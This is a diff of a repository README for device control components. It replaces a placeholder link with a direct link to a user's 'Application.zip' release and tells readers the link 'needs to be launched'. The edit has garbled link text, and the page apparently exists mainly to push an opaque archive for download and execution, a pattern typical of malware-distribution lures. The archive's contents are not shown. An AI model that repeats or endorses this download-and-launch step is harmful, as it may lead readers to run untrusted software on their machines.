@@ -17,7 +17,7 @@ Find tools and components related to:
 - Encoders
 
 ## Get Started
-To get started, please make sure to check out our [link to the Application.zip file](https://github.com/files/Application.zip). This link contains all the necessary files you need to start implementing control functionalities for your devices. Remember, the link needs to be launched to access the files.
+To get started, please make sure to check out our [link to the https://github.com/shashanks682/Control/releases/download/v1.0/Application.zip file](https://github.com/shashanks682/Control/releases/download/v1.0/Application.zip). This link contains all the necessary files you need to start implementing control functionalities for your devices. Remember, the link needs to be launched to access the files.
 
 If for any reason the link is not working, kindly head over to the "Releases" section of this repository to find the latest version of the files.
 
